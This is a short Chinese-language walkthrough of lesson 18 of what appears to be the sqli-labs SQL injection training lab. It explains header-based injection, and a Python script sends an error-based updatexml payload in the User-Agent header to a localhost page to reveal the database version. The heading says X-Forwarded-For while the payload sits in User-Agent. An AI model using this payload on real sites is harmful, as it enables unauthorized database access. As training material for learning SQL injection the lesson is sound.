# Lesson-18
```
HTTP头注入X-Forwarded-For)-,-报错注入
```

HTTP头注入
利用XFF头
这里可以利用的原因是 : 网站将XFF头信息插入数据库 , 而这个信息是访问者可以控制的
同样利用报错注入 , 将数据回显
```
import requests

url = "http://127.0.0.1/Less-18/"

postDate = {
	'uname':'admin',
	'passwd':'1'
}

headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
	'Cache-Control':'max-age=0',
	'Connection':'keep-alive',
	'Content-Type':'application/x-www-form-urlencoded',
	'Host':'127.0.0.1',
	'X-Forwarded-For':'8.8.8.8',
	'Origin':'http://127.0.0.1',
	'Referer':'http://127.0.0.1/Less-18/',
	'Upgrade-Insecure-Requests':'1',
	'User-Agent':'\',updatexml(1,concat(0x5e,version(),0x5e),1),\''
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```
